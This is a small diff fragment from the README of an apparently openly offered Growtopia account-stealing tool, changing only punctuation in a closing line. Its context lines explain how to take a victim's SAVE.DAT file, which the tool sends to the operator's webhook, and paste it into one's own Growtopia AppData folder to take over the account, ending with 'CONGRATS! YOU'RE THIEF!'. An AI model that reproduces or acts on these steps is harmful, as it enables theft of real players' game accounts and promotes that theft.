@@ -14,7 +14,7 @@ Growtopia was created (data-save) with a file named ```'save.dat'``` so if you g
 steal account. and already logged in your webhook, you can download the victim's ```SAVE.DAT``` file and transfer it to your growtopia data
 - > Path: ```C:/Users/PC-NAME/AppData/Local/Growtopia```
 - or right click on ```Growtopia``` then paste the victims save.dat
-- AND CONGRATS! YOU'RE THIEF!!
+- AND CONGRATS! YOU'RE THIEF!
 
 # output
 ```js
